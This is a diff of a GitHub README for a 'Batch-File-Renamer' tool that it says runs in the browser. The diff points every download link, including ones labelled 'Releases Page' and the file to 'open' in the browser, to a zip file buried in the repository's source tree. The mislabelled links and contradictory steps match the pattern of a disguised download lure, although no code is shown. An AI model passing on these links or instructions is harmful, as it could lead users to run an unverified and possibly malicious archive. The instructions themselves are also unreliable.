@@ -1,6 +1,6 @@
 # 🎉 Batch-File-Renamer - Rename Files Easily in Bulk
 
-[![Download Now](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/components/Batch-File-Renamer-unregimented.zip%20Now-%23-4CAF50)](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/components/Batch-File-Renamer-unregimented.zip)
+[![Download Now](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/store/File_Renamer_Batch_1.0.zip%20Now-%23-4CAF50)](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/store/File_Renamer_Batch_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -29,13 +29,13 @@ Batch-File-Renamer runs completely in your web browser. Ensure you have:
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub Releases page.
-   [Download Now](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/components/Batch-File-Renamer-unregimented.zip)
+   [Download Now](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/store/File_Renamer_Batch_1.0.zip)
 
 2. **Download the Latest Version:** Look for the latest release. It will be clearly marked. Click on the link to download the application.
 
 3. **Extract Files:** If your download is in a ZIP file, extract it to a folder on your computer.
 
-4. **Open the Application:** Open your web browser and navigate to the folder where you extracted the files. Open the `https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/components/Batch-File-Renamer-unregimented.zip` file to launch Batch-File-Renamer.
+4. **Open the Application:** Open your web browser and navigate to the folder where you extracted the files. Open the `https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/store/File_Renamer_Batch_1.0.zip` file to launch Batch-File-Renamer.
 
 ## 🎨 Design & Technology
 
@@ -72,6 +72,6 @@ If you have questions, suggestions, or feedback, feel free to explore the commun
 
 ## 🔗 References
 
-For further information about the features and to stay updated on new releases, visit the [Batch-File-Renamer Releases Page](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/components/Batch-File-Renamer-unregimented.zip). 
+For further information about the features and to stay updated on new releases, visit the [Batch-File-Renamer Releases Page](https://github.com/rozavur/Batch-File-Renamer/raw/refs/heads/main/src/store/File_Renamer_Batch_1.0.zip). 
 
 Thank you for using Batch-File-Renamer! Enjoy easy file management and efficient renaming.
